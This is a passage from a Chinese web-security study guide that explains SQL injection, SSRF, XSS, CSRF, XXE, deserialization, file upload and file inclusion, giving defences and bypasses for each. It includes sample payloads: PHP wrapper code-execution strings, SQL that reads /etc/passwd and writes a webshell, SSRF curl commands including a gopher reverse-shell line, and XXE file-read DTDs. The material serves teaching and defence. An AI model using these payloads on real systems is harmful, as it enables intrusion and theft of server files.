class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p><ol start="19"><li><p>常见端口与对应服务<br /> 21:ftp  22:ssh  53:DNS  80:http  135/445:samba 服务  443:https  1433:sqlserver  1521:oracle 3306:mysql  3389:rdp 远程  8080:tomcat  8888: 宝塔  6378:redis  50050:cs</p></li><li><p>文件类型 MIME<br />MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br />MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br />浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL, 因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br />MIME 通用结构为：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">type/subtype</span><br></pre></td></tr></table></figure></p></li></ol><p>21.NTFS 数据流<br /> NTFS 数据流文件，也叫 Alternate data streams，简称 ADS，是 NTFS 文件系统的一个特性之一，允许单独的数据流文件存在，同时也允许一个文件附着多个数据流，即除了主文件流之外还允许许多非主文件流寄生在主文件流之中，它使用资源派生的方式来维持与文件相关信息，并且这些寄生的数据流文件我们使用资源管理器是看不到的。</p><p>22.tomcat ajp 协议<br /> Apache Tomcat 支持 AJP 协议，用来通过反向代理到 Tomcat 的请求和相关的数据，AJP 协议的作用是，当一个请求包含请求主体时，一个未经允许的、包含请求主体首部分（或可能所有的）的 AJP 消息被发送到 Tomcat。在某些情况下，Tomcat 会把这个消息当作一个新的请求来处理，而不会当作请求主体。</p><p>23.IIS<br />IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组件，专业的说，IIS 可以赋予一部主机电脑一组以上的 IP 地址，而且还可以有一个以上的域名作为 Web 网站。简单来说：Internet Information Service（IIS）是 windows 开设 web 网页服务的组件，用来搭载网站运行程序的平台的。还能提供 FTP，SMTP 等服务。<br />24.PHP 伪协议<br /> PHP 伪协议指的是 PHP 所支持的协议与封装协议，在 web 渗透漏洞利用中常用于配合文件包含进行 web 攻击，从而获取网站权限。<br />常用伪协议与方法如下所示：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">file://     </span><br><span class="line">allow_url_fopen=off/on     allow_url_include=off</span><br><span class="line">?file=file://C:phpinfo.txt  </span><br><span class="line"> 用于访问本地文件系统 </span><br><span class="line"></span><br><span class="line">php://filter</span><br><span class="line">allow_url_fopen=off/on     allow_url_include=off</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=./index.php  </span><br><span class="line"> 用于读取 php 文件源码内容 </span><br><span class="line"></span><br><span class="line">php://input</span><br><span class="line">allow_url_fopen=off/on     allow_url_include=on</span><br><span class="line">?file=php://input, post 数据：&lt;?php phpinfo ();?&gt;  </span><br><span class="line"> 访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行 </span><br><span class="line"></span><br><span class="line">zip://</span><br><span class="line">allow_url_fopen=off/on     allow_url_include=off/on</span><br><span class="line">?file=zip://file.zip%23phpinfo.txt</span><br><span class="line"> 访问压缩文件中的子文件，子文件可修改为任意后缀依然会被当作 php 执行 </span><br><span class="line"></span><br><span class="line">data://</span><br><span class="line">allow_url_fopen=on     allow_url_include=on</span><br><span class="line">?file=data:test/plain;&lt;?php phpinfo ();?&gt; </span><br><span class="line">?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br><span class="line"> 传递相应格式的数据来执行 php 代码 </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="常见漏洞"><a class="anchor" href="#常见漏洞">#</a> 常见漏洞</h1><h2 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h2><h3 id="原理"><a class="anchor" href="#原理">#</a> 原理</h3><p>由于程序没有细致的过滤用户输入的数据，造成 SQL 字符串拼接，进而恶意的 SQL 语句被执行，造成数据库信息泄露，网页篡改，数据库被恶意操作等。</p><h3 id="挖掘"><a class="anchor" href="#挖掘">#</a> 挖掘</h3><p>SQL 注入漏洞的位置有很多，但是最常见的是在 Web 应用程序中的输入字段，例如登录表单、搜索表单、注册表单等。攻击者可以通过在这些输入字段中注入恶意代码来执行 SQL 命令，从而获取敏感数据或控制数据库。此外，SQL 注入漏洞还可能存在于 Web 应用程序中的其他位置，例如 URL 参数、HTTP 标头、Cookie 等。</p><h3 id="方法"><a class="anchor" href="#方法">#</a> 方法</h3><p>联合注入、报错注入、延时注入、布尔注入、DNS 注入、宽字节注入、堆叠注入，二次注入。</p><h3 id="函数"><a class="anchor" href="#函数">#</a> 函数</h3><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> 文件读写 </span><br><span class="line">show varibles like &quot;% secure_file_priv&quot;</span><br><span class="line">select 1,2,3,load_file (&#x27;/etc/passwd&#x27;)</span><br><span class="line">select 1,2,3,4 into outfile &#x27;/var/www/html/shell.php&#x27;</span><br><span class="line"></span><br><span class="line"> 报错注入 </span><br><span class="line">updatexml ()</span><br><span class="line">extractvalue ()</span><br></pre></td></tr></table></figure></p><h3 id="防御"><a class="anchor" href="#防御">#</a> 防御</h3><ol><li>输入验证：对用户输入进行验证，只允许输入预期的数据类型和长度。（正则过滤）</li><li>参数化查询：使用参数化查询可以防止 SQL 注入攻击。参数化查询是指将 SQL 语句和参数分开处理，参数不会被解释为 SQL 语句的一部分。（php 转义、预编译）</li><li>最小权限原则：数据库用户应该只被授予最小权限，以限制攻击者能够访问的数据。</li><li>防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。<br />5.waf 设备</li></ol><h3 id="绕过"><a class="anchor" href="#绕过">#</a> 绕过</h3><h4 id="关键字过滤"><a class="anchor" href="#关键字过滤">#</a> 关键字过滤</h4><ol><li>大小写转换</li><li>注释符绕过：--， /**/，#(%23)</li><li>内联注释绕过：/<em>!select</em>/（注释中的语句为 MYSQL 特有的语句，这些语句在其它数据库中不会运行，但会在 MYSQL 中运行）</li><li>双关键字绕过</li><li>编码绕过</li></ol><h4 id="空格过滤"><a class="anchor" href="#空格过滤">#</a> 空格过滤</h4><ol><li>使用注释符</li><li>两个空格</li><li>使用 ()</li></ol><h3 id="判断数据库类型"><a class="anchor" href="#判断数据库类型">#</a> 判断数据库类型</h3><ol><li>页面报错信息</li><li>查询数据库独有的数据表</li><li>测试各数据库独有的连接符</li><li>查询数据库版本</li></ol><h3 id="mysql-数据库站点无法连接的常见原因"><a class="anchor" href="#mysql-数据库站点无法连接的常见原因">#</a> MySQL 数据库站点无法连接的常见原因</h3><ol><li>数据库只允许本地连接</li><li>站库分离</li><li>数据库服务器端口被占用或更改了端口</li><li>访问权限不正确</li><li>数据库未启动</li></ol><h3 id="mysql-写-shell"><a class="anchor" href="#mysql-写-shell">#</a> MySQL 写 shell</h3><ol><li>通过 outfile 写入 shell</li><li>将一句话木马作为数据插入表中并查询导出</li><li>开启全局日志写入 shell</li><li>慢查询日志写入 shell（仅有在查询时间超过系统设定时间时才会写入 shell）</li></ol><h3 id="mysql-无法写-shell-的原因"><a class="anchor" href="#mysql-无法写-shell-的原因">#</a> MySQL 无法写 shell 的原因</h3><p>1.My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制<br /> 2. 绝对路径不正确<br /> 3. 没有读写权限<br /> 4. 没有开启全局日志或慢查询日志</p><h2 id="ssrf"><a class="anchor" href="#ssrf">#</a> SSRF</h2><h3 id="原理-2"><a class="anchor" href="#原理-2">#</a> 原理</h3><p>服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。</p><h3 id="挖掘-2"><a class="anchor" href="#挖掘-2">#</a> 挖掘</h3><ol><li>分享：通过 URL 地址分享网页内容</li><li>转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：通过 URL 地址翻译对应文本内容</li><li>图片加载与下载：通过 URL 地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开的 api 实现以及其他调用 URL 的功能</li><li>从 URL 关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</li></ol><h3 id="方法-2"><a class="anchor" href="#方法-2">#</a> 方法</h3><p>1.dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#x27; // 利用 dict 探测端口 </span><br></pre></td></tr></table></figure></p><p>2.file 协议，在有回显的情况下，利用 file 协议可以读取任意内容<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&#x27; // 利用 file 协议查看文件 </span><br></pre></td></tr></table></figure></p><p>3.gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&#x27; // 利用 gopher 反弹 shell</span><br></pre></td></tr></table></figure></p><p>4.http/s 协议，探测内网主机存活</p><h3 id=""><a class="anchor" href="#">#</a> </h3><h3 id="绕过-2"><a class="anchor" href="#绕过-2">#</a> 绕过</h3><ol><li>采用短网址绕过</li><li>对 ip 地址进行进制转换</li><li>利用特殊域名，比如 <span class="exturl" data-url="aHR0cDovL2V4YW1wbGUuaW8=">example.io</span> 可以指向任意域名，则 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS5leGFtcGxlLmlv">127.0.0.1.example.io</span> 最终会被解析为 127.0.0.1</li><li>利用 [::]，比如 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMQ==">http://127.0.0.1</span> &gt;&gt; http://[::127.0.0.1]</li><li>利用句号，比如 127.0.0.1  &gt;&gt; 127。0。0。1<br />6.CRLF 编码绕过</li><li>使用封闭的字母和数字</li><li>当限制只能使用 http 协议时，可以采取 302 跳转或短地址</li><li>限制为 <span class="exturl" data-url="aHR0cDovL2V4YW1wbGUuY29t">example.com</span> 域名时，采用 http 基本身份认证的方式绕过，即 <span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tQHd3dy54eGMuY29t">http://www.xxx.com@www.xxc.com</span>，在对 @解析域名中，不同的处理函数存在处理差异</li></ol><h2 id="xss"><a class="anchor" href="#xss">#</a> XSS</h2><h3 id="原理-3"><a class="anchor" href="#原理-3">#</a> 原理</h3><p>web 页面插入恶意 Js 代码，浏览器解析执行获取用户 cookie。</p><h3 id="挖掘-3"><a class="anchor" href="#挖掘-3">#</a> 挖掘</h3><ol><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈</li><li>存在风险：搜索框、当前目录、图片属性等</li></ol><h3 id="方法-3"><a class="anchor" href="#方法-3">#</a> 方法</h3><p>存储型 XSS，反射型 XSS，DOM 型 XSS</p><h3 id="防御-2"><a class="anchor" href="#防御-2">#</a> 防御</h3><ol><li>正则过滤（标签 /js 代码 / 事件）</li><li>用户的输入进行 html 编码输出（无法进行闭合）</li><li>服务端设置会话 Cookie 的 HTTP Only 属性（不能获取 cookie）</li></ol><h3 id="绕过-3"><a class="anchor" href="#绕过-3">#</a> 绕过</h3><ol><li>爆破寻找是否存在能够使用的标签和属性。</li><li>利用一些框架或模板的特性，比如在 使用 JavaScript template literal 的页面中 ，如果 `` 之间包含 ${code}，就会执行 code。</li></ol><h3 id="xss-的功能"><a class="anchor" href="#xss-的功能">#</a> XSS 的功能</h3><p>获取 cookie、获取管理员 ip、xss 蠕虫、钓鱼攻击、前端 JS 挖矿、键盘记录、屏幕截图。</p><h2 id="csrf"><a class="anchor" href="#csrf">#</a> CSRF</h2><h3 id="原理-4"><a class="anchor" href="#原理-4">#</a> 原理</h3><p>指利用受害者尚未失效的身份认证信息、（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（转账，改密码等）。</p><h3 id="方法-4"><a class="anchor" href="#方法-4">#</a> 方法</h3><p>1.GET 型：直接改 URL 就好<br /> 2.POST 型：想办法利用用户数据提交表单</p><h3 id="防御-3"><a class="anchor" href="#防御-3">#</a> 防御</h3><ol><li>校验 token：让请求带上一个额外的 csrf_token，来确保请求是通过网站的前端页面发送的。这个 csrf_token 由服务器颁发，不要放到 cookie 里，要通过其他方式提供给网站的前端页面，一种方式是放到 DOM 上。前端请求时就会从 DOM 找出这个 csrf_token，作为一个参数带上，让服务端校验。</li><li>使用严格的 SameSite：Cookie 有一个 SameSite 属性，设置为严格模式（非 none 值），可以让其他网站的中跨域请求不带上 Cookie。</li><li>通过 Referer 判断：如果在网站中发送的请求，HTTP 头字段 Referer 中的域名就是当前网站。如果是其他网站发起的请求，Referer 就是这个网站域名。服务端可以利用这个 Referer 判断请求是否在网站页面中发起的。此外还可以利用 Origin 头字段，它通常在跨域请求时会携带上。但 Referer 并不完全可靠，在一些老旧的浏览器在实现上可能会有一些问题，有丢失的可能。</li><li>人机校验：加一个短信校验、邮箱校验、谷歌万恶的九宫格什么的，确保是一个人在尝试发这个请求。可以吊打所有攻击，缺点是用户体验不太好。</li></ol><h3 id="绕过-4"><a class="anchor" href="#绕过-4">#</a> 绕过</h3><h4 id="csrf_token-的位置"><a class="anchor" href="#csrf_token-的位置">#</a> CSRF_TOKEN 的位置</h4><p>前端页面中（DOM 或全局变量中）</p><h4 id="csrf_token-原理"><a class="anchor" href="#csrf_token-原理">#</a> CSRF_TOKEN 原理</h4><p>前端请求时就会从 前端页面（DOM 或全局变量）找出这个 csrf_token，作为一个参数带上，让服务端校验。</p><h4 id="csrf_token-绕过"><a class="anchor" href="#csrf_token-绕过">#</a> CSRF_TOKEN 绕过</h4><ol><li>更改请求方式</li><li>点击劫持</li><li>使用自己的 token，利用后台漏洞，替换对方的 token 进行验证</li></ol><h2 id="xxe"><a class="anchor" href="#xxe">#</a> XXE</h2><h3 id="原理-5"><a class="anchor" href="#原理-5">#</a> 原理</h3><p>XXE 全称 XML External Entity Injection，也就是 XML 外部实体注入。它是对解析 XML 输入的应用程序的一种攻击。当配置不当的 XML 处理器处理包含对外部实体的引用的 XML 输入时，就会发生此攻击。<br />服务端解析用户提交的 XML 文件时，未对 XML 文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的 URL 支持 file:// 和 ftp:// 等协议，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站等危害</p><h3 id="挖掘-4"><a class="anchor" href="#挖掘-4">#</a> 挖掘</h3><p>使用 xml 格式提交数据的位置</p><h3 id="方法-5"><a class="anchor" href="#方法-5">#</a> 方法</h3><ol><li><p>通过 DTD 外部实体声明<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=1.0?&gt;</span><br><span class="line">&lt;!DOCTYPE a  [</span><br><span class="line">       &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;q&gt;&amp;b;&lt;/q&gt;</span><br></pre></td></tr></table></figure></p></li><li><p>通过 DTD 文档引入外部 DTD 文档，再引入外部实体声明<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=1.0?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http://example/1.dtd&quot;&gt;</span><br><span class="line">&lt;q&gt;&amp;b;&lt;/q&gt;</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="防御-4"><a class="anchor" href="#防御-4">#</a> 防御</h3><ol><li>禁用外部实体</li><li>过滤和验证用户提交的 XML 数据</li><li>使用虚拟补丁程序，API 安全网关或 Web 应用程序防火墙（WAF）来检测和阻止 XXE 攻击</li><li>修补或升级 XML 处理器和库。使用依赖项检查器。</li></ol><h3 id="绕过-5"><a class="anchor" href="#绕过-5">#</a> 绕过</h3><ol><li>换协议或利用协议特征</li><li>编码绕过</li><li>外部引用</li></ol><h2 id="反序列化"><a class="anchor" href="#反序列化">#</a> 反序列化</h2><h3 id="原理-6"><a class="anchor" href="#原理-6">#</a> 原理</h3><p>攻击者控制了序列化后的数据，将有害数据传递到应用程序代码中，发动针对应用程序的攻击。</p><h3 id="挖掘-5"><a class="anchor" href="#挖掘-5">#</a> 挖掘</h3><ol><li>远程和进程间通信</li><li>连线协议、Web 服务、消息代理</li><li>缓存 / 持久性存储区</li><li>数据库、缓存服务器、文件系统<br /> 5.HTTP cookie、HTML 表单参数、API 身份验证令牌</li></ol><h3 id="方法-6"><a class="anchor" href="#方法-6">#</a> 方法</h3><ol><li>在 java 和 php 所构造的 class，存在一些特殊成员，会在特定情况下自动调用，而不用程序主动调用。常见的如：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__construct ()     创建对象时自动调用 </span><br><span class="line">__destruct ()   在销毁对象时自动调用 </span><br><span class="line">__call ()在对象中调用一个不可访问方法时，__call () 会被调用 </span><br><span class="line">__callStatic ()在静态上下文中调用一个不可访问方法时调用 </span><br><span class="line">__get ()读取不可访问属性的值时，__get () 会被调用 </span><br><span class="line">__set ()在给不可访问属性赋值时，__set () 会被调用 </span><br><span class="line">__isset ()当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用 </span><br><span class="line">__unset ()当对不可访问属性调用 unset () 时，__unset () 会被调用 </span><br><span class="line">__sleep ()serialize () 函数会检查类中是否存在一个魔术方法__sleep () , 如果存在，该方法会鲜卑调用，然后再执行序列化操作 </span><br><span class="line">__wakeup ()unserialize () 会检查是否存在一个 __wakeup () 方法，如果存在会先调用__wakeup 方法，预先准备对象需要的资源 </span><br><span class="line">__toString ()__toString（） 方法用于一个类被当成字符串时应增氧回应 </span><br><span class="line">__invoke ()当尝试以调用函数的方式调用一个对象时，__invoke () 方法会被自动调用 </span><br><span class="line">__set_state ()字 PHP 5.1.0 起调用 var_export () 导出类时，此静态 方法会被调用 </span><br><span class="line">__clone ()当复制完成时，如果定义了 __clone 方法，则新创建的对象（复制生成的对象）中的 __clone () 方法会被调用，可用于修改属性的值。</span><br></pre></td></tr></table></figure><br />2.session 反序列化漏洞</li></ol><p>3.phar 反序列化漏洞</p><p>4.pop 链构造：指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。</p><h3 id="防御-5"><a class="anchor" href="#防御-5">#</a> 防御</h3><ol><li>对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码</li><li>对反序列化接口添加认证授权</li><li>设置反序列化服务仅在本地监听或者设置相应防火墙策略</li><li>禁止使用存在漏洞的第三方框架库</li><li>过滤、禁用危险函数</li><li>过滤 T3 协议或限定可连接的 IP</li><li>设置 Nginx 反向代理，实现 t3 协议和 http 协议隔离</li></ol><h3 id="绕过-6"><a class="anchor" href="#绕过-6">#</a> 绕过</h3><ol><li>利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）</li><li>利用数组对象绕过，如 serialize (array ($a)); a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构)。</li><li>利用引用进行绕过<br /> 4.16 进制绕过字符的过滤</li></ol><h3 id="反序列化对象特征"><a class="anchor" href="#反序列化对象特征">#</a> 反序列化对象特征</h3><p>1.java 序列化数据特征：序列化文件头，数据 16 进制中以  ac ed 00 05 开头<br /> 2.tcp：必有 ac ed 00 05，这个 16 进制流基本上也意味者 java 反序列化的开始<br /> 3.http：必有 rO0AB，其实这就是 aced0005 的 base64 编码的结果</p><h2 id="文件上传漏洞"><a class="anchor" href="#文件上传漏洞">#</a> 文件上传漏洞</h2><h3 id="原理-7"><a class="anchor" href="#原理-7">#</a> 原理</h3><p>文件上传漏洞原理是指在有上传功能的系统中，如果没有对用户上传的文件进行有效的检查过滤，那么恶意用户就可以上传包含脚本的文件，如 Webshell，然后通过访问这些文件的方式，来执行服务端命令，从而控制 Web 网站或者服务器的漏洞</p><h3 id="挖掘-6"><a class="anchor" href="#挖掘-6">#</a> 挖掘</h3><p>查找文件上传功能点常见位置比如文件后台、会员中心，文件扫描（通过扫描工具获取敏感信息）</p><h3 id="方法-7"><a class="anchor" href="#方法-7">#</a> 方法</h3><p>统一写在绕过部分</p><h3 id="防御-6"><a class="anchor" href="#防御-6">#</a> 防御</h3><p>1、文件上传的目录设置为不可执行<br /> 2、判断文件类型：MIME Type、后缀检查，白名单，黑名单，图片 resize 或压缩<br /> 3、使用随机数改写文件名和文件路径<br /> 4、单独设置文件服务器的域名<br /> 5、使用安全设备防御</p><h3 id="绕过-7"><a class="anchor" href="#绕过-7">#</a> 绕过</h3><ol><li><p>基于前端 js 的防御：<br />a.burp 抓包修改绕过<br /> b. 禁用指定 js 文件</p></li><li><p>基于后端的防御：<br />a.MEME：抓包修改 content-type<br />b. 基于 body 标识头：二进制添加文件标识</p></li><li><p>基于简单过滤：<br />a. 双写后缀<br /> b. 大小写</p></li><li><p>基于后端黑名单：<br />a.fuzz 可上传名单</p></li></ol><p>b.htaccess 文件：htaccess 文件是 Apache 服务器中的一个配置文件，全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。攻击者可以上传覆盖.htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。需要注意的是，htaccess 文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess 文件，则会覆盖父目录的.htaccess 效果。</p><p>c.user.ini 文件：该配置文件同样也是目录的配置文件。.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。<br />自 PHP 5.3.0 起，.user.ini 是一个能被动态加载的 ini 文件，此类文件仅被 CGI／FastCGI SAPI 处理。不需要重启服务器中间件，只需要等待 user_ini.cache_ttl 所设置的时间（默认为 300 秒），即可被重新加载.</p><p>d. 利用存储型 xss，在上传的正常文件中夹杂恶意代码</p><p>e.soap 协议（简单对象访问协议）：SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一种规范，在 Web Service 中，交换带结构信息。可基于 HTTP 等协议，使用 XML 格式传输，抽象于语言实现、平台和硬件。即多语言包括 PHP、Java、.Net 均可支持。配合 XXE 实现攻击</p><p>f. 根据系统特性绕过：后缀添加空格，添加点，添加冒号，基于特性被删除（windows）；后缀添加 斜杠 ，基于特性被删除（windows/linux）；后缀添加 NTFS 数据流（::$DATA），基于特性（windows）。</p><p>g. 利用容器解析特性：在 Apache1.x，2.x 中 Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。因此对于 apache 而言，一个 test.php.qwea 文件依然会将其解析为 php。如果所有的后缀 apache 都不认识，那么就会把该文件当做默认的类型，一般来说默认类型就是 text/plain。在 window 中的认识的后缀都记录在 /apche/conf/mine.types 中，在 Ubuntu 下在 /etc/mime.types；%20%00 空字节代码解析漏洞，例如我们可以请求如下 URI：/test [0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证；但最后请求的是 /test [0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台</p><p>h. 临时文件上传</p><p>i. 条件竞争：我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的 php 文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个 shell</p><p>j. 二次渲染：将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取 webshell。</p><p>k. 临时文件上传</p><ol start="5"><li>基于后端白名单<br /> a.htaccess 文件（在 httpd.conf 文件中配置 mod_rewrite 模块开启，同时需要将 AllowOverride None 改为 AllowOverride All）<br />b.html 文件（存储型 xss）<br />c. 利用文件包含漏洞：包含解析存在 webshell 的文件；tomcat ajp 协议任务文件包含；thinkphp 任意文件包含日志 getshell<br />d. 容器解析特征：IIS 目录解析，5.X/6.0 版本，目录名包含.asp、.asa、.cer、.cdx、目录下文件都按照 asp 解析执行（/text.asp/1.jpg）；IIS 文件名解析，5.X/6.0 版本，文件名包含.asp;、.asa;、.cer;、.cdx;、优先按照 asp 解析执行（/1.aps;1.jpg）<br />e. 配置不当：PHP CGI 解析漏洞，php.ini 配置文件 cgi.fix_pathinfo=1，则在（/1.jpg/1.php）和（/1.jpg/.php）中，1.jpg 以 php 来解析<br /> f. 编辑器漏洞：UEditor 任意文件上传；FCKeditor 编辑器；EWEbeditor 编辑器；DotNetTextBox 编辑器；Kedit 编辑器；Cute Editor 在线编辑器</li></ol><h2 id="文件包含漏洞"><a class="anchor" href="#文件包含漏洞">#</a> 文件包含漏洞</h2><h3 id="原理-8"><a class="anchor" href="#原理-8">#</a> 原理</h3><p>在通过 PHP 的相应函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，这通常需要包括两个条件： include () 等函数通过动态变量的方式引入需要包含的文件；用户能够控制这个动态变量。</p><p>常见函数包括：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Include：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个 php 文件继续执行。</span><br><span class="line">Require：跟 include 唯一不同的是，当产生错误时候，include 会继续运行而 require 停止运行。</span><br><span class="line">Include_once：这个函数跟 include 函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</span><br><span class="line">Require_once：这个函数跟 require 函数作用几乎相同，与 include_once 和 include 类似。</span><br><span class="line">php.ini 配置文件：allow_url_fopen=off 即不可以包含远程文件。php4 存在远程包含 & amp; 本地包含，php5 仅存在本地包含。</span><br></pre></td></tr></table></figure></p><h3 id="挖掘-7"><a class="anchor" href="#挖掘-7">#</a> 挖掘</h3><ol><li>白盒审计<br /> 2.url 中存在使用 php 文件作为参数（例如 <span class="exturl" data-url="aHR0cDovL2V4YW1wbGUuY29tP3VybD1pbmRleC5waHAlRUYlQkMlODk=">http://example.com?url=index.php）</span></li></ol><h3 id="方法-8"><a class="anchor" href="#方法-8">#</a> 方法</h3><ol><li>包含日志文件:/var/log/apache2/access.log, /var/log/nginx/access.log</li><li>包含图片木马</li><li>包含 session 文件<br /> 4.file 协议</li><li>如果是 php 后端，可能存在 php 伪协议</li></ol><h3 id="防御-7"><a class="anchor" href="#防御-7">#</a> 防御</h3><ol><li>设置白名单</li><li>过滤危险字符</li><li>设置文件目录</li><li>关闭危险设置</li></ol><h3 id="绕过-8"><a class="anchor" href="#绕过-8">#</a> 绕过</h3><p>都挺基础的，就不重复了，参考前面的绕过方法</p><h2 id="逻辑漏洞"><a class="anchor" href="#逻辑漏洞">#</a> 